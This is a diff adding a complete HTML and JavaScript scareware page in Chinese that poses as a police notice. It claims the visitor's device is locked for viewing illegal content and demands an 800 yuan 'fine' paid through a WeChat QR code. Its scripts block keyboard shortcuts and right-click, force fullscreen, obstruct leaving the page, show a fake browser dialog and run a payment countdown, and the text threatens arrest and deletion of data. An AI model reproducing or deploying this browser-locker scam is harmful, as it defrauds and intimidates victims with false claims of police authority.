@@ -1,0 +1,543 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN"><head><base href="/lander/wechat012_1742064757/index.html">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+
+<script>
+window.onkeydown = function (evt) {
+    if (evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17 || evt.keyCode == 46) {
+        return false
+    }
+};
+window.onkeypress = function (evn) {
+    if (evn.keyCode == 123 || evn.keyCode == 117) return false
+};
+
+function viewdiv(id){var el=document.getElementById(id);el.style.display="block";}
+
+onbeforeunload = function () {
+    alert("Нажмите ESC, чтобы закрыть страницу!");
+    return "Нажмите ESC, чтобы закрыть страницу!";}
+	
+var stroka = "";
+
+function toggleFullScreen() { 
+    if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen()
+        } else if (document.documentElement.mozRequestFullScreen) {
+            document.documentElement.mozRequestFullScreen()
+        } else if (document.documentElement.webkitRequestFullscreen) {
+            document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)
+        }
+    }
+}
+
+
+
+document.addEventListener('keyup', function (e) {
+    if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13 || e.keyCode == 27 ) {
+        toggleFullScreen();
+        document.getElementById('map').innerHTML = stroka;
+        viewdiv('mydiv');
+        document.body.style.cursor = 'not-allowed'
+    }
+}, false);
+
+var pr = 1;
+window.onload = function() {
+    document.onclick = function(e) {
+        e = e || event;
+        target = e.target || e.srcElement;
+        toggleFullScreen();
+        //if (pr <= 1) {
+        //    pr++;
+        //}
+            document.getElementById('map').innerHTML = stroka;
+            viewdiv('mydiv');
+        document.body.style.cursor = 'not-allowed';
+        
+         var i = 0;
+         setTimeout(function() { 
+         while (i < 30000) {
+//         alert ("Статус: Ожидается оплата штрафа ...");
+//toggleFullScreen();		
+//         alert ("Статус: Проверка оплаты штрафа ...");
+         i++;
+         }
+         }, 1000);
+         
+    }
+}	
+
+
+document.oncontextmenu=new Function("return false");
+
+
+</script>
+
+
+    <style>
+        .payment-button {
+            display: inline-block;
+            padding: 15px 30px;
+            background: linear-gradient(135deg, #8B0000, #690000);
+            color: white;
+            text-decoration: none;
+            border: none;
+            border-radius: 10px;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(139, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payment-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(139, 0, 0, 0.4);
+            background: linear-gradient(135deg, #690000, #8B0000);
+        }
+
+        .payment-button:active {
+            transform: translateY(1px);
+            box-shadow: 0 2px 10px rgba(139, 0, 0, 0.3);
+        }
+
+        /* Иконка */
+        .payment-button .icon {
+            font-size: 24px;
+            margin-right: 12px;
+            display: inline-block;
+        }
+
+        /* Глобальные стили */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f0f2f5;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+        }
+
+        /* Дополнительные эффекты */
+        .payment-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                90deg,
+                transparent,
+                rgba(255, 255, 255, 0.2),
+                transparent
+            );
+            transition: 0.5s;
+        }
+
+        .payment-button:hover::before {
+            left: 100%;
+        }
+
+        /* Адаптивность */
+        @media (max-width: 768px) {
+            .payment-button {
+                padding: 16px 30px;
+                font-size: 14px;
+            }
+
+            .payment-button .icon {
+                font-size: 20px;
+            }
+        }
+    </style>
+    <!-- Подключение иконок WeChat -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+
+<style>
+html,body{margin:0;padding:0;height:100%;width:100%;-moz-user-select:-moz-none;-o-user-select:none;-khtml-user-select:none;-webkit-user-select:none;user-select:none;background:#ffffff}table{font-size:16px;color:#000000;font-family:'PT Sans', 'Arial', 'Helvetica', sans-serif}.txt{font-size:15px}.blok{font-size:14px}
+
+
+img.rightoftable{
+    display: inline-block;
+}
+
+table.table1{
+    display: inline-table;
+}
+
+  @keyframes blink {
+    0% { opacity: 1; }
+    100% { opacity: 0.3; }
+  }
+
+  @keyframes glow {
+    0% { box-shadow: 0 0 15px red; }
+    100% { box-shadow: 0 0 25px blue; }
+  }
+</style>
+
+<style id="supercopy_user_select">*{user-select: text !important;-webkit-user-select: text !important;-webkit-touch-callout: text !important;}</style></head>
+<body style="cursor: not-allowed;">
+
+
+
+
+<table width="100%" height="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#000000">
+<tbody><tr>
+<td height="61" align="center" valign="top"><div id="map"></div><div id="ots"></div>
+</td></tr>
+<tr>
+<td align="center" valign="top"><br><br>
+<div id="mydiv" style="display: block;">
+<table width="100%" height="594" cellpadding="0" cellspacing="0" border="0" bgcolor="#000000">
+<tbody><tr><td width="30%" valign="top">
+</td>
+<td width="833">
+<table width="833" height="552" cellpadding="0" cellspacing="0" border="0" bgcolor="#390000">
+<tbody><tr>
+<td valign="top">
+ <table width="800" height="400" cellpadding="5" cellspacing="0" border="0" bgcolor="#ff0000">
+ <tbody><tr>
+ <td>
+   <table width="800" height="400" cellpadding="10" cellspacing="0" border="0" bgcolor="#fbfbfb">
+   <tbody><tr>
+   <td colspan="3" height="97" valign="top">
+      <table border="0" width="100%"><tbody><tr><td>
+         <img src="https://xcpdw.github.io/rk/img/1.png" width="130" height="130" border="0">
+<img src="https://xcpdw.github.io/rk/img/ga.png" width="130" height="130" border="0">
+      </td><td align="right">
+         <table width="270" height="100" cellpadding="5" cellspacing="1" border="0" bgcolor="#a2a2a2">
+         <tbody><tr>
+         <td bgcolor="#d5d5d5"><font color="#000000" size="2">
+         您的姓： <font color="#008400">已确定。</font><br>
+         您的所在地：<font color="#008400">已确定。</font><br>
+         您当前的位置：  <font color="#008400">已确定。</font><br>
+         您的 IP 地址:  <font color="#bc0000">106.109.33.102 (贵州黔南)</font><br>
+        设备上的所有文件：  <font color="#bc0000">已锁定。</font>
+		<br>罚款支付：<font color="#bc0000"><b>扫描二维码</b></font>
+        <br>
+         </font></td>
+         </tr>
+         </tbody></table>
+      </td></tr></tbody></table>
+   </td>
+   </tr>
+   <tr>
+   <td align="center" valign="middle" width="150">
+      <table width="300" cellpadding="0" cellspacing="0" height="60" borfer="0" bgcolor="#970000">
+      <tbody><tr>
+      <td align="center" bgcolor="#f2f2f2">
+     <b>
+  <p style="
+    color: white; 
+    font-size: 26px; 
+    font-weight: bold; 
+    text-align: center; 
+    text-transform: uppercase;
+    text-shadow: 2px 2px 10px rgba(255, 0, 0, 0.9), -2px -2px 10px rgba(0, 0, 255, 0.9);
+    background: linear-gradient(to right, red, black, blue);
+    padding: 20px;
+    border: 4px solid white;
+    border-radius: 10px;
+    animation: blink 0.6s infinite alternate, glow 1s infinite alternate;">
+    你的设备已被锁定！
+  </p>
+</b>
+      </td>
+      </tr>
+      </tbody></table>
+   </td>
+   <td align="left" valign="top" height="80">
+  <font color="#003205" font="" size="5">第0945-I346736I778号罚款</font>
+
+  
+   
+   
+   
+<div style="display: flex; align-items: center; gap: 20px; font-size: 27px; font-weight: bold;">
+   你被罚款 <span style="color: #970000;">800元</span>
+   
+</div>
+   
+   </td>
+   <td align="center" valign="middle">
+   </td>
+   </tr>
+   <tr>
+   <td align="center" valign="top" colspan="3">
+      <table width="800">
+      <tbody><tr>
+      <td align="left" valign="top" class="txt">
+
+      <font color="#171717" font="" size="4">  您因多次访问包含中华人民共和国法律禁止的内容而被禁止。<br>
+
+
+
+您必须根据第0945-I346736I778号条例，将<b>  800元</b> 罚款转入公安部罚款征收账户。
+<br>
+
+
+<br><br>
+
+
+</font></td></tr></tbody></table> 
+    <style>
+        .pay-open-btn {
+            padding: 12px 24px;
+            font-size: 20px;
+            cursor: pointer;
+            background-color: #970000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin: 10px;
+            transition: background-color 0.3s;
+        }
+
+        .pay-open-btn:hover {
+            background-color: #7a0000;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: -150px;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 1.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 20px;
+            max-width: 350px;
+            width: 90%;
+            position: relative;
+            text-align: center;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .close-btn {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .loading-container {
+            margin-top: 15px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .loading-text {
+            font-size: 22px;
+            color: #970000;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 15px;
+        }
+
+        .spinner {
+            width: 25px;
+            height: 25px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #970000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .timer-container {
+            background-color: #ffebee;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            min-width: 120px;
+            margin-top: 80px; /* Увеличили отступ сверху */
+        }
+
+        .timer {
+            font-size: 24px;
+            font-weight: bold;
+            color: #970000;
+            margin: 5px 0;
+        }
+
+        .warning-text {
+            font-size: 14px;
+            color: #970000;
+            font-weight: bold;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+
+     <button class="payment-button" onclick="openModal()">
+        <span class="icon"><i class="fab fa-weixin"></i></span>缴纳罚款</button>
+
+    <div class="modal" id="modal" style="display: none;">
+        <div class="modal-container">
+            <span class="close-btn">×</span>
+            <div style="display: flex; justify-content: space-between; align-items: center; width: 100%; padding: 10px 0;">
+                <div style="flex: 1; padding: 0 10px;">
+                    <img src="E:\搞破坏\resource\HNzvXR4.md.png" width="110" height="60" border="0"><br>
+                    <center><b>扫描二维码支付罚款</b></center>
+                    <img src="https://lirocasqzka.xyz/lander/wechat012_1742064757/w3.png??1751804434744" width="150" height="150" border="0" onload="refreshOr(this)">
+                </div>
+                <div style="display: flex; flex-direction: column; align-items: center;">
+                    <div class="timer-container">
+                        <div class="timer" id="timer">1:21</div>
+                        <div class="warning-text">还剩下时间</div>
+                    </div>
+                    <div class="loading-container">
+                        <span class="loading-text">等待付款</span>
+                        <div class="spinner"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let timerRunning = false; // Глобальная переменная для отслеживания состояния таймера
+
+        function openModal() {
+            document.getElementById('modal').style.display = 'flex';
+            if (!timerRunning) { // Проверяем, запущен ли уже таймер
+                startTimer(1941); // 30 минут = 1800 секунд
+                timerRunning = true; // Устанавливаем флаг что таймер работает
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+        }
+
+        window.onclick = function(event) {
+            const modal = document.getElementById('modal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+
+        function refreshOr(element) {
+            setTimeout(function() {
+                element.src = element.src.split('??')[0] + '??' + new Date().getTime();
+                refreshOr(element);
+            }, 5000);
+        }
+
+        function startTimer(duration) {
+            const timerElement = document.getElementById('timer');
+            let minutes = Math.floor(duration / 60);
+            let seconds = duration % 60;
+            
+            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+            // Добавление анимации при определенных значениях времени
+            if (minutes === 5 || minutes === 10 || minutes === 15 || minutes === 20 || minutes === 25) {
+                timerElement.style.animation = 'none';
+                setTimeout(() => {
+                    timerElement.style.animation = 'none';
+                }, 100);
+            }
+
+            if (duration > 0) {
+                setTimeout(() => startTimer(duration - 1), 1000);
+            }
+        }
+    </script>
+ 
+
+
+     
+   
+
+
+
+ 
+ 
+
+
+
+
+ <br>
+
+
+
+<font color="#003205" font="" size="5"><br>&nbsp;&nbsp;<b>支付罚款后，您的计算机将自动解锁，将不会对您提起刑事诉讼！
+</b></font><br>
+      <font color="#970000" font="" size="4">&nbsp;&nbsp;<b>重要须知！</b> 如果您拒绝支付罚款或试图在不支付罚款的情况下自行解除锁定，您设备上的所有信息将被永久删除，以防止违法信息的传播。警方将立即前往您的住处逮捕您。你将因观看和传播违法信息制品而受到刑事起诉。罚款支付期限：通知和锁定发出后3小时。
+</font>
+      </td>
+      </tr>
+      
+      
+   
+   
+   </tbody></table>
+ </td>
+ </tr>
+ </tbody></table>
+</td>
+</tr>
+</tbody></table>
+</td>
+<td width="30%"></td></tr>
+</tbody></table>
+</div>
+</td>
+</tr><tr>
+<td></td></tr>
+<tr><td valign="bottom">
+</td></tr></tbody></table>
+<script type="text/javascript">
+document.getElementById('map').innerHTML = "<div style='top:-3px;position:fixed;left:50%;width:402px;margin:0 0 0 -221px;background-color:#fbfbfb;border:1px solid #c7c7c7;padding:16px 19px 21px 19px;border-radius:3px;font:11.7px Arial;color:#000;box-shadow:0 3px 3px -2px rgba(0,0,0,0.5)'><div style='float:right;margin:-17px -11px;font-size:18px;color:#808080;cursor:pointer;'>&times;</div><div style='font: 17px Verdana, Arial;text-align:left !important;margin-bottom:4px'>是否离开此页面？</div><br><div style='font:20.5px Verdana, Arial;text-align:left !important;margin:-2px 0 1px 0'>所做的更改可能不会保存。</div><br><div style='float:right;margin-top:10px'><button style='background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px;font-size:16px;cursor:pointer;border-radius:2px;border: 1px solid #6e80ff;font-weight:700;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);'>关闭</button><button style='background-color:#fbfbfb;color:#000;padding:7px 12px 8px 12px;margin:0 3px 0 3px;font-size:16px;cursor:pointer;border-radius:2px;border: 1px solid #bfbfbf;font-weight:200;box-shadow:0 1px 1px -1px rgba(0,0,0,0.7);'>留下</button></div></div>";
+</script>
+ <script>
+        // Скрипт для закрытия страницы через 1 час
+        setTimeout(function() {
+            // Попытка закрыть страницу
+            try {
+                // Отключаем обработчик beforeunload
+                window.onbeforeunload = null;
+                
+                // Пытаемся закрыть окно
+                window.close();
+                
+                // Если window.close() не работает, пытаемся изменить location
+                if (window.location) {
+                    window.location.href = 'about:blank';
+                }
+            } catch (e) {
+                // Если всё не работает, показываем сообщение
+                alert("Не удалось закрыть страницу автоматически. Пожалуйста, закройте её вручную.");
+            }
+        }, 3000000); // 3600000 мс = 1 час
+    </script>
+
+</body></html>
